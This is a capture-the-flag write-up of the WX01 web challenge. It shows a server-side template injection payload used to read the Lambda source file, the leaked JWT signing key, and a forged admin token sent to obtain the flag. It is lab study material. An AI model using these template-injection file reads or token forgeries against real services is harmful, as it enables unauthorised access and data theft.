# WX01 - 1000pts

## Briefing

> Access the url at: <https://cfta-wx01.allyourbases.co> and find a way to login to the admin portal to get the flag. Note: You have been provided with the following credentials to help you: username: `tim` password: `berners-lee`

## Solution

1. There is a login form and a form to enter an email address to get help logging in. Attempting to login with the provided credentials, `tim:berners-lee`, and monitoring requests using Burp Suite shows that a POST request with the JSON `action` key set to `verify` and a `token` key that corresponds to a JSON Web Token.

2. I attempted to brute force decrypt this JWT, but it did not succeed.

3. I moved on to the help form. It has to serve a purpose and thus must be vulnerable to some form of input. I tried a [SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) similar to the Italian dish suggestion site from [WM04](../WM04/README.md). Crashing the help form using the SSTI string `{{foo()}}` prints this as part of a stacktrace:

    ```
    File "/var/task/lambda_function.py", line 18, in getHelp
    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)
    ```

    We have access to `locals()` and `globals()`. Also, `open()` lets us read an arbitrary file.

4. Use `{{open('lambda_function.py').read()}}` to dump the contents of `lambda_function.py`:

    ```python
    import json
    import urllib
    import jwt
    import os

    # JWT Key
    key = "aversion-chute-freeway-corporal"
    algo = "HS256"

    def getHelp(event):
        email = ''.join(event['email'])
        template = """
        <p>Your request has been submitted.</p>
        <p>You will receive an email at: %s</p>
        <p>This might take a reaaaaaaally long time though (forever).</p>
        """ % (urllib.parse.unquote(email).replace("<", "&lt;").replace(">", "&gt;"))
        msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)
        msg = msg[:-len(msg)+700]
        return msg
    ```

    The JWT key is `aversion-chute-freeway-corporal`.

5. Login with credentials `tim:berners-lee` to get a JWT: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJ1c2VyIn0.j8wX114OSLEo2I4S6GQ4wQ4ZszXtyp0wFc0lpwc1yRQ`.

6. Use [jsonwebtoken.io](https://www.jsonwebtoken.io/) to change the `role` value from `user` to `admin` with the leaked secret key to get a new JWT:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiIsImp0aSI6IjUxZjE3OTJiLWMwYjItNGQ3NS04YjY5LTE0ZDM5ZjJkMGM2NiIsImlhdCI6MTYxNzcyNDk1MiwiZXhwIjoxNjE3NzI4NTUyfQ.QoopGSdFjhSe0gxHwEng-n6e9Z5FTP3_-iemndGcJVU`

7. Send a request with this JSON `{"action":"verify","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiIsImp0aSI6IjUxZjE3OTJiLWMwYjItNGQ3NS04YjY5LTE0ZDM5ZjJkMGM2NiIsImlhdCI6MTYxNzcyNDk1MiwiZXhwIjoxNjE3NzI4NTUyfQ.QoopGSdFjhSe0gxHwEng-n6e9Z5FTP3_-iemndGcJVU"}` to get the flag.

### Flag

`muLtiStagingIT710-12`
